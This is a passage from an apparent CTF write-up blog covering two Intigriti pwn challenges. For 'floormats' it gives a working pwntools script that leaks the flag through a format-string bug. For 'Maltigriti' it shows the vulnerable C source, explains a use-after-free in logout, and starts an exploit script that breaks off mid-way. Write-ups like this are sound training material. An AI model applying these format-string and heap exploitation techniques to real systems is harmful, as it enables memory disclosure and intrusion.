mats.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Please choose from our currently available floor mats\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Note: Out of stock items have been temporarily delisted\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please select a floor mat:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    <span class="built_in">puts</span>(s[i]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nEnter your choice:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">if</span> ( choice &lt;= <span class="number">0</span> || choice &gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = choice - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">5</span> )</span><br><span class="line">    fgets(flag, <span class="number">64</span>, stream);    <span class="comment">// &lt;-- here</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nPlease enter your shipping address:&quot;</span>);</span><br><span class="line">  fgets(format, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nYour floor mat will be shipped to:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is FSB. So I can leak stack. </p><p>First, save the flag to the stack through menu 6. Then I leak the flag using FSB. </p><h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./floormats&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;floormats.ctf.intigriti.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./floormats&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;%18$p_%19$p_%20$p_%21$p_%22$p_%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">strings = p.recvline().strip().split(<span class="string">b&#x27;_0x&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(strings)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    ascii_str = <span class="built_in">bytes</span>.fromhex(s.decode()).decode()[::-<span class="number">1</span>]</span><br><span class="line">    flag += ascii_str</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Maltigriti-62-solves-x2F-352-points"><a href="#Maltigriti-62-solves-x2F-352-points" class="headerlink" title="Maltigriti (62 solves &#x2F; 352 points)"></a>Maltigriti (62 solves &#x2F; 352 points)</h2><blockquote><p>I just submitted my third bug report to Maltirgiti (a competitor of Intigriti), and it was again closed as a duplicate!<br>Can you figure out what is going on and get me my well deserved swag pack?<br>Author: c0nrad - Sloppy Joe Pirates<br>maltigriti.ctf.intigriti.io 1337</p></blockquote><p>This was my favorite chall I solved recently. &lt;3</p><h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>The C source code was provided. From what I‚Äôve seen, the code is well written, so I‚Äôll share it in full.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pwn/maltigriti</span></span><br><span class="line"><span class="comment">// by c0nrad - Sloppy Joe Pirates</span></span><br><span class="line"><span class="comment">// Enjoy &lt;3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> STATUS_ACCEPTED = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> STATUS_REJECTED = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> STATUS_DUPLICATE = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">User</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="type">char</span> password[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> bio_length;</span><br><span class="line">    <span class="type">char</span> *bio;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Report</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">User</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="type">char</span> status;</span><br><span class="line">    <span class="type">long</span> bounty;</span><br><span class="line">    <span class="type">char</span> title[<span class="number">32</span>];</span><br><span class="line">    <span class="type">char</span> body[<span class="number">128</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_reports</span><span class="params">(<span class="keyword">struct</span> Report *report)</span> &#123;</span><br><span class="line">    <span class="type">int</span> counter = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (report != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--- Report #%d ---\n&quot;</span>, counter++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Title: %s\n&quot;</span>, report-&gt;title);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Body: %s\n&quot;</span>, report-&gt;body);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (report-&gt;status == STATUS_ACCEPTED) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Accepted\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (report-&gt;status == STATUS_REJECTED) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Rejected\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (report-&gt;status == STATUS_DUPLICATE) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Duplicate\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Status: Unknown\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bounty: %ld\n&quot;</span>, report-&gt;bounty);</span><br><span class="line">        report = report-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, (<span class="type">char</span> *)<span class="number">0x0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, (<span class="type">char</span> *)<span class="number">0x0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, (<span class="type">char</span> *)<span class="number">0x0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\n--- Welcome to maltigriti&#x27;s bug bounty reporting system! ---&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0. Register User&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Edit User&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Submit a bug report&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Print Reports&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Print Balance&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Buy Swag Pack&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6. Logout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;7. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;menu&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_user</span><span class="params">(<span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="number">0</span> &amp;&amp; user-&gt;bio != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your current bio is: %s\n&quot;</span>, user-&gt;bio);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your new bio&gt; &quot;</span>);</span><br><span class="line">        fgets(user-&gt;bio, user-&gt;bio_length, <span class="built_in">stdin</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t have a bio yet!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How long is your bio&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user-&gt;bio_length);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        user-&gt;bio = <span class="built_in">malloc</span>(user-&gt;bio_length);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your new bio&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        fgets(user-&gt;bio, user-&gt;bio_length, <span class="built_in">stdin</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">logout</span><span class="params">(<span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;name, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;password, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;bio, <span class="number">0</span>, user-&gt;bio_length);</span><br><span class="line">        <span class="built_in">free</span>(user-&gt;bio);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calculate_balance</span><span class="params">(<span class="keyword">struct</span> Report *report, <span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="type">int</span> balance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (report != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (report-&gt;status == STATUS_ACCEPTED &amp;&amp; report-&gt;user == user) &#123;</span><br><span class="line">            balance += report-&gt;bounty;</span><br><span class="line">        &#125;</span><br><span class="line">        report = report-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your balance is: %d\n&quot;</span>, balance);</span><br><span class="line">    <span class="keyword">return</span> balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buy_swag_pack</span><span class="params">(<span class="keyword">struct</span> Report *report, <span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (calculate_balance(report, user) &gt;= <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You have enough money to buy a swag pack!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;With great swag comes great responsibility.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Here is your swag pack: flag&#123;redacted_redacted&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t have enough money to buy a swag pack!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Keep submitting bug reports and maybe you&#x27;ll get there one day!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;:evil_grin:&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> User *<span class="title function_">register_user</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">User</span> *<span class="title">user</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> User));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name&gt; &quot;</span>);</span><br><span class="line">    fgets(user-&gt;name, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your password&gt; &quot;</span>);</span><br><span class="line">    fgets(user-&gt;password, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    edit_user(user);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Report *<span class="title function_">new_report</span><span class="params">(<span class="keyword">struct</span> Report *firstReport, <span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">report</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Report));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (firstReport != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// get last report</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">scanner</span> =</span> firstReport;</span><br><span class="line">        <span class="keyword">while</span> (scanner-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            scanner = scanner-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        scanner-&gt;next = report;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        firstReport = report;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    report-&gt;user = user;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your report title&gt; &quot;</span>);</span><br><span class="line">    fgets(report-&gt;title, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the content of your report&gt; &quot;</span>);</span><br><span class="line">    fgets(report-&gt;body, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Automatically mark the status as duplicate so we don&#x27;t have to pay anyone :evil_grin:</span></span><br><span class="line">    report-&gt;status = STATUS_DUPLICATE;</span><br><span class="line">    report-&gt;bounty = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thank you for submitting your bug report!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unfortunately our records indicate that this bug has already been submitted!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Report will be closed and marked as duplicate.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hope you didn&#x27;t spend too much time on it! ( Õ°¬∞ Õú ñ Õ°¬∞) &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> firstReport;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Report</span> *<span class="title">reports</span> =</span> <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">User</span> *<span class="title">user</span> =</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> report_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> menu_choice = <span class="number">0</span>;</span><br><span class="line">    setup();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu_choice);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (menu_choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                user = register_user();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                edit_user(user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                reports = new_report(reports, user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                print_reports(reports);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                calculate_balance(reports, user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                buy_swag_pack(reports, user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                logout(user);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The condition of getting flag is in the <code>buy_swag_pack</code> function. I need to reconstruct <code>report-&gt;status</code> and <code>report-&gt;status</code> to get the flag.</p><p>The vulnerability is that only <code>user-&gt;bio</code> is freed in the logout function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">logout</span><span class="params">(<span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;name, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;password, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;bio, <span class="number">0</span>, user-&gt;bio_length);</span><br><span class="line">        <span class="built_in">free</span>(user-&gt;bio);    <span class="comment">// &lt;-- here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Since <code>bio-&gt;length</code> can be specified in the <code>register_user</code> function, it can be set to be the same as the size of the <code>report</code> object. This means that you can freely configure the <code>report</code> object using UAF.</p><h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./maltigriti&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;maltigriti.ctf.intigriti.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./maltigriti&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">length, bio</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name&gt;&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;password&gt;&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, bio)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_user</span>(<span class="params">new_bio, leak=<span class="number">0</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span 